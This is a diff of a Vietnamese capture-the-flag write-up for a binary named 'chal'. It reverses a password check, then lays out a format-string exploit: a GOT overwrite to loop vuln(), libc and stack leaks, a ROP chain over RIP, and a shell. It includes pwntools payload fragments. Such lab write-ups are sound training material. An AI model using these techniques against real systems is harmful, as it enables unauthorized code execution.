@@ -1,11 +1,18 @@
-file: `chal`
+##vault
+___
+### Thông tin:
+
+Thông tin file: `chal`
 ```c
 ┌──(kali㉿kali)-[~/training_PWN/vault_of_lost_memories/challenge]
 └─$ checksec --file=chal  
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols   FORTIFY  Fortified       Fortifiable     FILE
 Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols  No     0               3               chal
 ```
-assembly code tu ghidra: `chal`
+* `Partial RELRO`: có thể overwrite GOT
+* `No PIE`: địa chỉ trong binary là tĩnh
+
+Code từ **Ghidra**:
 ```c
 undefined4 main(void)
 {
@@ -106,7 +113,7 @@ void vuln(void)
   return;
 }
 ```
-tu IDA:
+Code từ **IDA**: 
 ````c
 __int64 game()
 {
@@ -144,16 +151,15 @@ __int64 game()
 }
 
 with dword_... following from the memory:
-
 .data:0000000000404090 dword_404090    dd 35h                  ; DATA XREF: game+18D↑r
-
 .data:0000000000404094 dword_404094    dd 0Ah 
 ````
-ascii table:
+____
+Có bảng **ascii** để đối chiếu với chương trình encrypt trên:
 
 <img width="873" height="578" alt="image" src="https://github.com/user-attachments/assets/0c61380c-e108-4439-9165-7af85f7028ab" />
 
-reverse scramble code in C:
+Code `c` decrypt chương trình trên:
 ````c
 #include <stdlib.h>
 #include <stdio.h>
@@ -181,12 +187,14 @@ int main() {
 	return 0;
 }
 ````
-Output:
+Chạy code `c` và ta được password gốc sau:
 
 <img width="658" height="303" alt="image" src="https://github.com/user-attachments/assets/3a4a78e6-5c82-4ad7-baaa-3c2c8895f0c8" />
 <img width="656" height="314" alt="image" src="https://github.com/user-attachments/assets/b8981381-03f9-4b88-bf3e-74c93fca604e" />
 
-script.py:
+Chạy thử với binary xem password có đúng không:
+
+`script.py`:
 ````python
 from pwn import *
 
@@ -212,12 +220,78 @@ p.sendlineafter(b">>> ", payload)
 
 p.interactive()
 ````
+Ta quan sát output từ chương trình:
 
 <img width="655" height="441" alt="image" src="https://github.com/user-attachments/assets/925c3fdb-5712-46fc-b26f-c8bb76ac4ce6" />
 
 <img width="657" height="316" alt="image" src="https://github.com/user-attachments/assets/d22e07dc-ee95-48ae-94ff-9de73185c5d7" />
+___
+### Bước khai thác:
+Code của phần chương trình có lỗ hổng:
+```c
+void vuln(void)
+{
+  long in_FS_OFFSET;
+  char buffer [136];
+  long canary;
+  
+  canary = *(long *)(in_FS_OFFSET + 0x28);
+  memset(buffer,0,128);
+  puts("How should we address you? ");
+  printf(">>> ");
+  fgets(buffer,128,stdin);
+  printf("hello ");
+  printf(buffer);
+  printf("Here are the lost memories:");
+  putc(10,stdout);
+  system("ls *.pdf");
+  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail();
+  }
+  return;
+}
+```
+**Khai thác:**
+- `fgets(buffer,128,stdin);`: đọc input với size bé hơn size buffer --> ~không có BOF~
+- `printf(buffer);`: lỗ hổng **formatstring**; dùng `%p` để leak và `%n` để overwrite
+- Vì file là `Partial RELRO`, ta có thể dùng formatstring write để overwrite một số chức năng theo ý của mình
 
-final script:
+**Ý tưởng:**
+* B1: dùng `%n` overwrite GOT của system -> địa chỉ của `vuln()` (vì **NO PIE** nên địa chỉ vuln() cố định)
+--> mỗi lần thực thi system() là chạy lại vuln() từ đầu
+--> tạo được vòng loop trong vuln(), nhằm tái sử dụng formatstring
+
+<img width="413" height="112" alt="image" src="https://github.com/user-attachments/assets/54341ce9-b30e-4ea5-a09c-adb230075b65" />
+
+```python
+vuln_addr = 0x401448
+payload = fmtstr_payload(6, {exe.got['system']: vuln_addr})
+```
+* B2: dùng `%p` để leak thông tin như: địa chỉ stack, địa chỉ libc
+--> bởi vì overwrite **system@got** thành từ đầu của **vuln()**, sẽ tạo một stack frame mới (push rbp; mov rbp, rsp; sub rsp, 0x90)
+
+<img width="395" height="110" alt="image" src="https://github.com/user-attachments/assets/18be8763-aea4-40a3-867c-55adebe1b2bc" />
+ 
+--> vì thế, phải căn offset `%{i}$p` để leak cho chuẩn
+```python
+payload = b"%p %49$p"
+```
+--> leak xong, tính toán ra địa chỉ: libc.address, rip
+```python
+rip = addr + 0x308
+libc.address = leak_libc - 0x29ca8 
+```
+* B3: dùng `%n` overwrite RIP với ROP gadgets từ libc tính được
+
+* B4: dùng `%n` overwrite lại **system@got** (hiện là địa chỉ **vuln()**) thành của `printf` của libc
+--> `system("ls *.pdf")` sẽ thành `printf("ls *.pdf")`, in ra dòng string `"ls *.pdf"`
+--> không làm cho system() bị corrupted, mà vẫn bypass được cái system()
+--> `vuln()` đọc đến RIP và thực thi dòng ROP mà mình overwrite từ trước
+--> được shell 
+
+___
+Final script:
 ```python
 from pwn import *
 
